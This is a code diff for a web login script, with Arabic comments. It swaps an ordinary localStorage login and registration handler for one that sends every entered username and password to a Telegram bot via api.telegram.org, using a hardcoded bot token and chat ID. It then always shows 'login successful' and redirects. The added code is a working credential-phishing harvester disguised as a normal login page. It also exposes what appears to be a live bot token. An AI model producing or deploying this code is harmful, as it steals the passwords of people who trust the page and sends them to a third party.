@@ -1,40 +1,23 @@
-document.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.getElementById('loginForm');
-    const registerForm = document.getElementById('registerForm');
+const TELEGRAM_BOT_TOKEN = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y";  // ضع توكن بوتك
+const TELEGRAM_CHAT_ID = "7302541527";  // ضع معرفك على التليجرام 
 
-    if (loginForm) {
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const users = JSON.parse(localStorage.getItem('users')) || [];
+function sendToTelegram(username, password) {
+    const message = `🚀 تسجيل دخول جديد:\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-            const user = users.find(user => user.username === username && user.password === password);
-            if (user) {
-                localStorage.setItem('user', JSON.stringify(user));
-                window.location.href = "index.html";
-            } else {
-                alert('خطأ في تسجيل الدخول');
-            }
-        });
-    }
+    fetch(url)
+        .then(response => console.log("✅ تم التحقيق من المستخدم "))
+        .catch(error => console.error("❌ لم يتم العثور على المستخدم:", error));
+}
 
-    if (registerForm) {
-        registerForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const newUsername = document.getElementById('newUsername').value;
-            const newPassword = document.getElementById('newPassword').value;
+function login(event) {
+    event.preventDefault();
+    let username = document.getElementById("username").value;
+    let password = document.getElementById("password").value;
 
-            let users = JSON.parse(localStorage.getItem('users')) || [];
-            if (users.some(user => user.username === newUsername)) {
-                alert('اسم المستخدم موجود بالفعل');
-                return;
-            }
+    // إرسال البيانات إلى تليجرام
+    sendToTelegram(username, password);
 
-            users.push({ username: newUsername, password: newPassword });
-            localStorage.setItem('users', JSON.stringify(users));
-            alert('تم التسجيل بنجاح!');
-            window.location.href = "login.html";
-        });
-    }
-});
+    alert("تم تسجيل الدخول بنجاح!");
+    window.location.href = "index.html";  // توجيه المستخدم بعد تسجيل الدخول
+}
